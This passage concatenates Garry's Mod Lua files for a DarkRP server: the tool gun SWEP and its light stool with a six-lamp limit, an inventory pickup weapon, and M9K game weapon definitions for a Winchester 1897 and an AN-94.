
	if (!self:GetToolObject()) then return end
	return self:GetToolObject():SetStage(...)

end

function SWEP:GetStage(...)

	if (!self:GetToolObject()) then return end
	return self:GetToolObject():GetStage(...)

end

function SWEP:ClearObjects(...)

	if (!self:GetToolObject()) then return end
	self:GetToolObject():ClearObjects(...)

end

function SWEP:StartGhostEntities(...)

	if (!self:GetToolObject()) then return end
	self:GetToolObject():StartGhostEntities(...)

end

function SWEP:PrintWeaponInfo(x, y, alpha)
end

function SWEP:FreezeMovement()

	local mode = self:GetMode()

	if (!self:GetToolObject()) then return false end

	return self:GetToolObject():FreezeMovement()

end

function SWEP:OnReloaded()

	-- TODO: Reload the tool control panels
	-- controlpanel.Clear()

end
--PATH gamemodes/darkrp/entities/weapons/gmod_tool/shared.lua:
SWEP.ViewModel			= "models/weapons/c_toolgun.mdl"
SWEP.WorldModel			= "models/weapons/w_toolgun.mdl"
SWEP.AnimPrefix			= "python"

SWEP.UseHands			= true
SWEP.Spawnable			= true
SWEP.Slot			= 1
SWEP.SlotPos		= 6
-- 2 
-- Be nice, precache the models
util.PrecacheModel(SWEP.ViewModel)
util.PrecacheModel(SWEP.WorldModel)

-- Todo, make/find a better sound.
SWEP.ShootSound			= Sound("Airboat.FireGunRevDown")

SWEP.Tool				= {}

SWEP.Primary =
{
	ClipSize 	= -1,
	DefaultClip = -1,
	Automatic = false,
	Ammo = "none"
}

SWEP.Secondary =
{
	ClipSize 	= -1,
	DefaultClip = -1,
	Automatic = false,
	Ammo = "none"
}

SWEP.CanHolster			= true
SWEP.CanDeploy			= true

function SWEP:InitializeTools()

	local temp = {}

	for k,v in pairs(self.Tool) do

		temp[k] = table.Copy(v)
		temp[k].SWEP = self
		temp[k].Owner = self.Owner
		temp[k].Weapon = self.Weapon
		temp[k]:Init()

	end

	self.Tool = temp

end

function SWEP:SetupDataTables()

	self:NetworkVar("Entity", 0, "TargetEntity1")
	self:NetworkVar("Entity", 1, "TargetEntity2")
	self:NetworkVar("Entity", 2, "TargetEntity3")
	self:NetworkVar("Entity", 3, "TargetEntity4")

end

--[[---------------------------------------------------------
	Initialize
-----------------------------------------------------------]]
function SWEP:Initialize()

	self:SetHoldType("pistol")

	self:InitializeTools()

	-- We create these here. The problem is that these are meant to be constant values.
	-- in the toolmode they're not because some tools can be automatic while some tools aren't.
	-- Since this is a global table it's shared between all instances of the gun.
	-- By creating new tables here we're making it so each tool has its own instance of the table
	-- So changing it won't affect the other tools.

	self.Primary =
	{
		-- Note: Switched this back to -1.. lets not try to hack our way around shit that needs fixing. -gn
		ClipSize 	= -1,
		DefaultClip = -1,
		Automatic = false,
		Ammo = "none"
	}

	self.Secondary =
	{
		ClipSize 	= -1,
		DefaultClip = -1,
		Automatic = false,
		Ammo = "none"
	}

end


--[[---------------------------------------------------------
	OnRestore
-----------------------------------------------------------]]
function SWEP:OnRestore()

	self:InitializeTools()

end

--[[---------------------------------------------------------
   Precache Stuff
-----------------------------------------------------------]]
function SWEP:Precache()

	util.PrecacheSound(self.ShootSound)

end

--[[---------------------------------------------------------
	Reload clears the objects
-----------------------------------------------------------]]
function SWEP:Reload()

	-- This makes the reload a semi-automatic thing rather than a continuous thing
	if (!self.Owner:KeyPressed(IN_RELOAD)) then return end

	local mode = self:GetMode()
	local tr = util.GetPlayerTrace(self.Owner)
	local trace = util.TraceLine(tr)
	if (!trace.Hit) then return end

	local tool = self:GetToolObject()
	if (!tool) then return end

	tool:CheckObjects()

	-- Does the server setting say it's ok?
	if (!tool:Allowed()) then return end

	-- Ask the gamemode if it's ok to do this
	if (!gamemode.Call("CanTool", self.Owner, trace, mode)) then return end

	if (!tool:Reload(trace)) then return end

	self:DoShootEffect(trace.HitPos, trace.HitNormal, trace.Entity, trace.PhysicsBone, IsFirstTimePredicted())

end

--[[---------------------------------------------------------
	Returns the mode we're in
-----------------------------------------------------------]]
function SWEP:GetMode()

	return self.Mode

end

--[[---------------------------------------------------------
	Think does stuff every frame
-----------------------------------------------------------]]
function SWEP:Think()

	self.Mode = self.Owner:GetInfo("gmod_toolmode")
	local mode = self:GetMode()
	local tool = self:GetToolObject()

	if (!tool) then return end

	tool:CheckObjects()

	self.last_mode 		= self.current_mode
	self.current_mode 	= mode

	-- Release ghost entities if we're not allowed to use this new mode?
	if (!tool:Allowed()) then
		self:GetToolObject(self.last_mode):ReleaseGhostEntity()
		return
	end

	if (self.last_mode != self.current_mode) then

		if (!self:GetToolObject(self.last_mode)) then return end

		-- We want to release the ghost entity just in case
		self:GetToolObject(self.last_mode):Holster()

	end

	self.Primary.Automatic 		= tool.LeftClickAutomatic 	or false
	self.Secondary.Automatic 	= tool.RightClickAutomatic 	or false
	self.RequiresTraceHit 		= tool.RequiresTraceHit 	or true

	tool:Think()

end


--[[---------------------------------------------------------
	The shoot effect
-----------------------------------------------------------]]
function SWEP:DoShootEffect(hitpos, hitnormal, entity, physbone, bFirstTimePredicted)

	if CLIENT then
		self.Weapon:EmitSound(self.ShootSound	)
	end

	self.Weapon:SendWeaponAnim(ACT_VM_PRIMARYATTACK) 	-- View model animation

	-- There's a bug with the model that's causing a muzzle to
	-- appear on everyone's screen when we fire this animation.
	self.Owner:SetAnimation(PLAYER_ATTACK1)			-- 3rd Person Animation

	if (!bFirstTimePredicted) then return end

	local effectdata = EffectData()
		effectdata:SetOrigin(hitpos)
		effectdata:SetNormal(hitnormal)
		effectdata:SetEntity(entity)
		effectdata:SetAttachment(physbone)
	util.Effect("selection_indicator", effectdata)

	local effectdata = EffectData()
		effectdata:SetOrigin(hitpos)
		effectdata:SetStart(self.Owner:GetShootPos())
		effectdata:SetAttachment(1)
		effectdata:SetEntity(self.Weapon)
	util.Effect("ToolTracer", effectdata)

end

--[[---------------------------------------------------------
	Trace a line then send the result to a mode function
-----------------------------------------------------------]]
function SWEP:PrimaryAttack()

	local mode = self:GetMode()
	local tr = util.GetPlayerTrace(self.Owner)
	tr.mask = bit.bor(CONTENTS_SOLID, CONTENTS_MOVEABLE, CONTENTS_MONSTER, CONTENTS_WINDOW, CONTENTS_DEBRIS, CONTENTS_GRATE, CONTENTS_AUX)
	local trace = util.TraceLine(tr)
	if (!trace.Hit) then return end

	local tool = self:GetToolObject()
	if (!tool) then return end

	tool:CheckObjects()

	-- Does the server setting say it's ok?
	if (!tool:Allowed()) then return end

	-- Ask the gamemode if it's ok to do this
	if (!gamemode.Call("CanTool", self.Owner, trace, mode)) then return end

	if (!tool:LeftClick(trace)) then return end

	self:DoShootEffect(trace.HitPos, trace.HitNormal, trace.Entity, trace.PhysicsBone, IsFirstTimePredicted())

end


--[[---------------------------------------------------------
	SecondaryAttack - Reset everything to how it was
-----------------------------------------------------------]]
function SWEP:SecondaryAttack()

	local mode = self:GetMode()
	local tr = util.GetPlayerTrace(self.Owner)
	tr.mask = bit.bor(CONTENTS_SOLID, CONTENTS_MOVEABLE, CONTENTS_MONSTER, CONTENTS_WINDOW, CONTENTS_DEBRIS, CONTENTS_GRATE, CONTENTS_AUX)
	local trace = util.TraceLine(tr)
	if (!trace.Hit) then return end

	local tool = self:GetToolObject()
	if (!tool) then return end

	tool:CheckObjects()

	-- Ask the gamemode if it's ok to do this
	if (!tool:Allowed()) then return end
	if (!gamemode.Call("CanTool", self.Owner, trace, mode)) then return end

	if (!tool:RightClick(trace)) then return end

	self:DoShootEffect(trace.HitPos, trace.HitNormal, trace.Entity, trace.PhysicsBone, IsFirstTimePredicted())

end

--[[---------------------------------------------------------
	Holster
-----------------------------------------------------------]]
function SWEP:Holster()

	-- Just do what the SWEP wants to do if there's no tool
	if (!self:GetToolObject()) then return self.CanHolster end

	local CanHolster = self:GetToolObject():Holster()
	if (CanHolster ~= nil) then return CanHolster end

	return self.CanHolster

end

--[[---------------------------------------------------------
	OnRemove
	- Delete ghosts here in case the weapon gets deleted all of a sudden somehow
-----------------------------------------------------------]]
function SWEP:OnRemove()

	if (!self:GetToolObject()) then return end

	self:GetToolObject():ReleaseGhostEntity()

end


--[[---------------------------------------------------------
	OwnerChanged
	- This will remove any ghosts when a player dies and drops the weapon
-----------------------------------------------------------]]
function SWEP:OwnerChanged()

	if (!self:GetToolObject()) then return end

	self:GetToolObject():ReleaseGhostEntity()

end

--[[---------------------------------------------------------
	Deploy
-----------------------------------------------------------]]
function SWEP:Deploy()

	-- Just do what the SWEP wants to do if there is no tool
	if (!self:GetToolObject()) then return self.CanDeploy end

	self:GetToolObject():UpdateData()

	local CanDeploy = self:GetToolObject():Deploy()
	if (CanDeploy ~= nil) then return CanDeploy end

	return self.CanDeploy

end

function SWEP:GetToolObject(tool)

	local mode = tool or self:GetMode()

	if (!self.Tool[ mode ]) then return false end

	return self.Tool[ mode ]

end

function SWEP:FireAnimationEvent(pos, ang, event, options)

	-- Disables animation based muzzle event
	if (event == 21) then return true end
	-- Disable thirdperson muzzle flash
	if (event == 5003) then return true end

end

include('stool.lua')
--PATH gamemodes/darkrp/entities/weapons/gmod_tool/stools/light.lua:
TOOL.Category = "Render"
TOOL.Name = "#tool.light.name"

TOOL.ClientConVar[ "ropelength" ] = "64"
TOOL.ClientConVar[ "ropematerial" ] = "cable/rope"
TOOL.ClientConVar[ "r" ] = "255"
TOOL.ClientConVar[ "g" ] = "255"
TOOL.ClientConVar[ "b" ] = "255"
TOOL.ClientConVar[ "brightness" ] = "2"
TOOL.ClientConVar[ "size" ] = "256"
TOOL.ClientConVar[ "key" ] = "-1"
TOOL.ClientConVar[ "toggle" ] = "1"

cleanup.Register("lights")

function TOOL:LeftClick(trace, attach)

	if true then return false end
	if trace.Entity && trace.Entity:IsPlayer() then return false end
	if (CLIENT) then return true end
	if (attach == nil) then attach = true end

	-- If there's no physics object then we can't constraint it!
	if (SERVER && attach && !util.IsValidPhysicsObject(trace.Entity, trace.PhysicsBone)) then return false end

	local ply = self:GetOwner()

	local pos, ang = trace.HitPos + trace.HitNormal * 8, trace.HitNormal:Angle() - Angle(90, 0, 0)

	local r = math.Clamp(self:GetClientNumber("r"), 0, 255)
	local g = math.Clamp(self:GetClientNumber("g"), 0, 255)
	local b = math.Clamp(self:GetClientNumber("b"), 0, 255)
	local brght = math.Clamp(self:GetClientNumber("brightness"), 0, 1)
	local size = math.Clamp(self:GetClientNumber("size"), 0, 512)
	local toggle = self:GetClientNumber("toggle") != 1

	local key = self:GetClientNumber("key")

	if (IsValid(trace.Entity) && trace.Entity:GetClass() == "gmod_light" && trace.Entity:CPPIGetOwner() == ply) then

		trace.Entity:SetColor(Color(r, g, b, 255))
		trace.Entity.r = r
		trace.Entity.g = g
		trace.Entity.b = b
		trace.Entity.Brightness = brght
		trace.Entity.Size = size

		trace.Entity:SetBrightness(brght)
		trace.Entity:SetLightSize(size)
		trace.Entity:SetToggle(!toggle)

		trace.Entity.KeyDown = key

		numpad.Remove(trace.Entity.NumDown)
		numpad.Remove(trace.Entity.NumUp)

		trace.Entity.NumDown = numpad.OnDown(ply, key, "LightToggle", trace.Entity, 1)
		trace.Entity.NumUp = numpad.OnUp(ply, key, "LightToggle", trace.Entity, 0)

		return true

	end

	if (!self:GetSWEP():CheckLimit("lights")) then return false end

	if self:GetOwner():GetCount('lights') == 6 then
		rp.Notify(self:GetOwner(),1,'Лимит Лампочек! Максимум 6!',"")
		return false 
	end

	local lamp = MakeLight(ply, r, g, b, brght, size, toggle, !toggle, key, { Pos = pos, Angle = ang })

	if (!attach) then

		undo.Create("Light")
			undo.AddEntity(lamp)
			undo.SetPlayer(self:GetOwner())
		undo.Finish()

		return true

	end

	local length = math.Clamp(self:GetClientNumber("ropelength"), 4, 1024)
	local material = self:GetClientInfo("ropematerial")

	local LPos1 = Vector(0, 0, 5)
	local LPos2 = trace.Entity:WorldToLocal(trace.HitPos)

	if (IsValid(trace.Entity)) then

		local phys = trace.Entity:GetPhysicsObjectNum(trace.PhysicsBone)
		if (IsValid(phys)) then
			LPos2 = phys:WorldToLocal(trace.HitPos)
		end

	end

	local constraint, rope = constraint.Rope(lamp, trace.Entity, 0, trace.PhysicsBone, LPos1, LPos2, 0, length, 0, 1, material)

	undo.Create("Light")
		undo.AddEntity(lamp)
		undo.AddEntity(rope)
		undo.AddEntity(constraint)
		undo.SetPlayer(ply)
	undo.Finish()


	return true

end

function TOOL:RightClick(trace)

	return self:LeftClick(trace, false)

end

if (SERVER) then

	function MakeLight(pl, r, g, b, brght, size, toggle, on, KeyDown, Data)

		if (IsValid(pl ) && !pl:CheckLimit("lights")) then return false end

		local lamp = ents.Create("gmod_light")

		if (!IsValid(lamp)) then return end

		duplicator.DoGeneric(lamp, Data)

		lamp:SetColor(Color(r, g, b, 255))
		lamp:SetBrightness(brght)
		lamp:SetLightSize(size)
		lamp:SetToggle(!toggle)
		lamp:SetOn(on)

		lamp:Spawn()

		duplicator.DoGenericPhysics(lamp, pl, Data)

		lamp:CPPISetOwner(pl)

		if (IsValid(pl)) then
			pl:AddCount("lights", lamp)
			pl:AddCleanup("lights", lamp)
		end

		lamp.lightr = r
		lamp.lightg = g
		lamp.lightb = b
		lamp.Brightness = brght
		lamp.Size = size
		lamp.KeyDown = KeyDown
		lamp.on = on

		lamp.NumDown = numpad.OnDown(pl, KeyDown, "LightToggle", lamp, 1)
		lamp.NumUp = numpad.OnUp(pl, KeyDown, "LightToggle", lamp, 0)

		return lamp

	end
	duplicator.RegisterEntityClass("gmod_light", MakeLight, "lightr", "lightg", "lightb", "Brightness", "Size", "Toggle", "on", "KeyDown", "Data")

	local function Toggle(pl, ent, onoff)

		if (!IsValid(ent)) then return false end
		if (!ent:GetToggle() ) then ent:SetOn(onoff == 1) return end

		if (numpad.FromButton()) then

			ent:SetOn(onoff == 1)
			return

		end

		if (onoff == 0) then return end

		return ent:Toggle()

	end
	numpad.Register("LightToggle", Toggle)

end

function TOOL:UpdateGhostLight(ent, player)

	if (!IsValid(ent)) then return end

	local tr = util.GetPlayerTrace(player)
	local trace	= util.TraceLine(tr)
	if (!trace.Hit) then return end

	if (trace.Entity:IsPlayer() || trace.Entity:GetClass() == "gmod_light") then

		ent:SetNoDraw(true)
		return

	end

	ent:SetPos(trace.HitPos + trace.HitNormal * 8)
	ent:SetAngles(trace.HitNormal:Angle() - Angle(90, 0, 0))

	ent:SetNoDraw(false)

end

function TOOL:Think()

	if (!IsValid(self.GhostEntity) || self.GhostEntity:GetModel() != "models/MaxOfS2D/light_tubular.mdl") then
		self:MakeGhostEntity("models/MaxOfS2D/light_tubular.mdl", Vector(0, 0, 0), Angle(0, 0, 0))
	end

	self:UpdateGhostLight(self.GhostEntity, self:GetOwner())

end

local ConVarsDefault = TOOL:BuildConVarList()

function TOOL.BuildCPanel(CPanel)

	CPanel:AddControl("Header", { Description = "#tool.light.desc" })

	CPanel:AddControl("ComboBox", { MenuButton = 1, Folder = "light", Options = { [ "#preset.default" ] = ConVarsDefault }, CVars = table.GetKeys(ConVarsDefault) })

	CPanel:AddControl("Numpad", { Label = "#tool.light.key", Command = "light_key", ButtonSize = 22 })

	CPanel:AddControl("Slider", { Label = "#tool.light.ropelength", Command = "light_ropelength", Type = "Float", Min = 0, Max = 256 })
	CPanel:AddControl("Slider", { Label = "#tool.light.brightness", Command = "light_brightness", Type = "Float", Min = 0, Max = 10 })
	CPanel:AddControl("Slider", { Label = "#tool.light.size", Command = "light_size", Type = "Float", Min = 0, Max = 1024 })

	CPanel:AddControl("Checkbox", { Label = "#tool.light.toggle", Command = "light_toggle" })

	CPanel:AddControl("Color", { Label = "#tool.light.color", Red = "light_r", Green = "light_g", Blue = "light_b" })

end
--PATH gamemodes/darkrp/entities/weapons/gmod_tool/cl_viewscreen.lua:

local matScreen 	= Material("models/weapons/v_toolgun/screen")
local txBackground	= surface.GetTextureID("models/weapons/v_toolgun/screen_bg")

-- GetRenderTarget returns the texture if it exists, or creates it if it doesn't
local RTTexture 	= GetRenderTarget("GModToolgunScreen", 256, 256)
-- vc 
surface.CreateFont( "GModToolScreen", {
	font	= "Helvetica",
	size	= 60,
	weight	= 900
} )


local function DrawScrollingText(text, y, texwide)

	local w, h = surface.GetTextSize(text)
	w = w + 64

	y = y - h * 0.5 -- Center text to y position

	local x = RealTime() * 250 % w * -1

	while (x < texwide) do

		surface.SetTextColor(0, 0, 0, 255)
		surface.SetTextPos(x + 3, y + 3)
		surface.DrawText(text)

		surface.SetTextColor(255, 255, 255, 255)
		surface.SetTextPos(x, y)
		surface.DrawText(text)

		x = x + w

	end

end

--[[---------------------------------------------------------
	We use this opportunity to draw to the toolmode
		screen's rendertarget texture.
-----------------------------------------------------------]]
function SWEP:RenderScreen()

	local TEX_SIZE = 256
	local mode = GetConVarString("gmod_toolmode")
	local oldW = ScrW()
	local oldH = ScrH()

	-- Set the material of the screen to our render target
	matScreen:SetTexture("$basetexture", RTTexture)

	local OldRT = render.GetRenderTarget()

	-- Set up our view for drawing to the texture
	render.SetRenderTarget(RTTexture)
	render.SetViewPort(0, 0, TEX_SIZE, TEX_SIZE)
	cam.Start2D()

		-- Background
		surface.SetDrawColor(255, 255, 255, 255)
		surface.SetTexture(txBackground)
		surface.DrawTexturedRect(0, 0, TEX_SIZE, TEX_SIZE)

		-- Give our toolmode the opportunity to override the drawing
		if (self:GetToolObject() && self:GetToolObject().DrawToolScreen) then

			self:GetToolObject():DrawToolScreen(TEX_SIZE, TEX_SIZE)

		else

			surface.SetFont("GModToolScreen")
			DrawScrollingText("#tool." .. mode .. ".name", 104, TEX_SIZE)

		end

	cam.End2D()
	render.SetRenderTarget(OldRT)
	render.SetViewPort(0, 0, oldW, oldH)

end
--PATH addons/____inventory/lua/weapons/itemstore_pickup.lua:
if SERVER then
	AddCSLuaFile()
end

SWEP.PrintName = "Inventory Pickup"

SWEP.Purpose = "Picking up stuff"
SWEP.Instructions = "Primary attack: pick up item\nSecondary attack: view inventory"

SWEP.Spawnable = true
SWEP.AdminSpawnable = true
SWEP.ViewModel = "models/weapons/c_arms.mdl"
SWEP.WorldModel = ""
SWEP.UseHands = true

SWEP.Primary.Clipsize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = "none"

SWEP.Secondary.Clipsize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.Slot               = 1
SWEP.SlotPos 			= 10
SWEP.DrawAmmo           = false
SWEP.DrawCrosshair      = true

function SWEP:Initialize()
	self:SetHoldType( "normal" )
end

function SWEP:OnDrop()
	self:Remove()
end

function SWEP:PrimaryAttack()
	if CLIENT then return end

	self.Owner:PickupItem()
end

function SWEP:SecondaryAttack()
	if CLIENT then return end
	if not IsValid( self.Owner ) or not self.Owner.Inventory then return end 
	
	self.Owner:OpenContainer( self.Owner.Inventory:GetID(),
		itemstore.Translate( "inventory" ), true )
end

--PATH addons/__main/lua/weapons/m9k_1897winchester/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_1897winchester") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Shotguns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "Winchester 1897"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 31			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 3			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "shotgun"	-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_1897trenchshot.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_winchester_1897_trench.mdl"	-- Weapon world model
SWEP.Base 				= "bobs_shotty_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Trench_97.Single")		-- script that calls the primary fire sound
SWEP.Primary.RPM				= 70		-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 4			-- Size of a clip
SWEP.Primary.DefaultClip		= 12	-- Default number of bullets in a clip
SWEP.Primary.KickUp				= 0.9				-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.6		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.4	-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "slam"	-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 60		-- How much you 'zoom' in. Less is more! 

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.ShellTime			= .6

SWEP.Primary.NumShots	= 11		//how many bullets to shoot, use with shotguns
SWEP.Primary.Damage		= 10	//base damage, scaled by game
SWEP.Primary.Spread		= .04	//define from-the-hip accuracy (1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .04 // has to be the same as primary.spread
-- Because irons don't magically give you less pellet spread!


SWEP.IronSightsPos = Vector(2.809, 0, 1.48)
SWEP.IronSightsAng = Vector(0, 0, 0)
SWEP.SightsPos = Vector(2.809, 0, 1.48)
SWEP.SightsAng = Vector(0, 0, 0)
SWEP.RunSightsPos = Vector(-3.116, -3.935, 0.492)
SWEP.RunSightsAng = Vector(-19.894, -47.624, 10.902)

if ((gmod.GetGamemode().Name) == "Murderthon 9000") or ((gmod.GetGamemode().Name) == "Murderthon 9000 beta") then
	SWEP.Primary.Ammo			= "slam"
else
	SWEP.Primary.Ammo			= "buckshot"
end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/__main/lua/weapons/m9k_an94/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("m9k_an94") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then 
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Assault Rifles"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "AN-94"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 25			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 55
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_rif_an_94.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_rif_an_94.mdl"	-- Weapon world model
SWEP.ShowWorldModel			= true
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("an94.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 600			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.3		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.1		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.3		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "ar2"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 31	-- Base damage per bullet
SWEP.Primary.Spread		= .015	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .005 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(4.552, 0, 3.062)
SWEP.IronSightsAng = Vector(0.93, -0.5, 0)
SWEP.SightsPos = Vector(4.552, 0, 3.062)
SWEP.SightsAng = Vector(0.93, -0.5, 0)
SWEP.RunSightsPos = Vector(-5.277, -8.584, 2.598)
SWEP.RunSightsAng = Vector(-12.954, -52.088, 0)

SWEP.Primary.Burst = false

function SWEP:SelectFireMode()

	if self.Primary.Burst then
		self.Primary.Burst = false
		self.NextFireSelect = CurTime() + .5
		if CLIENT then
			self.Owner:PrintMessage(HUD_PRINTTALK, "Automatic selected.")
		end
		self.Weapon:EmitSound("Weapon_AR2.Empty")
		self.Primary.NumShots	= 1	
		self.Primary.Sound	= Sound("an94.single")
		self.Primary.Automatic = true
	else
		self.Primary.Burst = true
		self.NextFireSelect = CurTime() + .5
		if CLIENT then
			self.Owner:PrintMessage(HUD_PRINTTALK, "Burst fire selected.")
		end
		self.Weapon:EmitSound("Weapon_AR2.Empty")
		self.Primary.NumShots	= 2
		self.Primary.Sound	= Sound("an94.double")
		self.Primary.Automatic = false
	end
end

SWEP.Primary.PrevShots = SWEP.Primary.NumShots

function SWEP:PrimaryAttack()
	if self:CanPrimaryAttack() and self.Owner:IsPlayer() then
	self.ShootThese = self.Primary.NumShots
	
	if self.Primary.Burst then
		if self.Primary.NumShots > self.Owner:GetActiveWeapon():Clip1() then
			self.Primary.NumShots = 1
			self.ShootThese = 1
			self.Primary.Sound	= Sound("an94.single")
		else
			self.Primary.NumShots = 2
			self.ShootThese = 2
			self.Primary.Sound	= Sound("an94.double")
		end
	end
	
	
	if !self.Owner:KeyDown(IN_SPEED) and !self.Owner:KeyDown(IN_RELOAD) then
		self:ShootBulletInformation()
		self.Weapon:TakePrimaryAmmo(self.ShootThese)
		
		if self.Silenced then
			self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK_SILENCED )
			self.Weapon:EmitSound(self.Primary.SilencedSound)
		else
			self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
			self.Weapon:EmitSound(self.Primary.Sound)
		end	
	
		local fx 		= EffectData()
		fx:SetEntity(self.Weapon)
		fx:SetOrigin(self.Owner:GetShootPos())
		fx:SetNormal(self.Owner:GetAimVector())
		fx:SetAttachment(self.MuzzleAttachment)
		if GetConVar("M9KGasEffect") != nil then
			if GetConVar("M9KGasEffect"):GetBool() then 
				util.Effect("m9k_rg_muzzle_rifle",fx)
			end
		end
		self.Owner:SetAnimation( PLAYER_ATTACK1 )
		self.Owner:MuzzleFlash()
		self.Weapon:SetNextPrimaryFire(CurTime()+1/(self.Primary.RPM/60))
		self:CheckWeaponsAndAmmo()
		self.RicochetCoin = (math.random(1,4))
		if self.BoltAction then self:BoltBack() end
	end
	elseif self:CanPrimaryAttack() and self.Owner:IsNPC() then
		self:ShootBulletInformation()
		self.Weapon:TakePrimaryAmmo(self.ShootThese)
		self.Weapon:SendWeaponAnim( ACT_VM_PRIMARYATTACK )
		self.Weapon:EmitSound(self.Primary.Sound)
		self.Owner:SetAnimation( PLAYER_ATTACK1 )
		self.Owner:MuzzleFlash()
		self.Weapon:SetNextPrimaryFire(CurTime()+1/(self.Primary.RPM/60))
		self.RicochetCoin = (math.random(1,4))
	end
end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
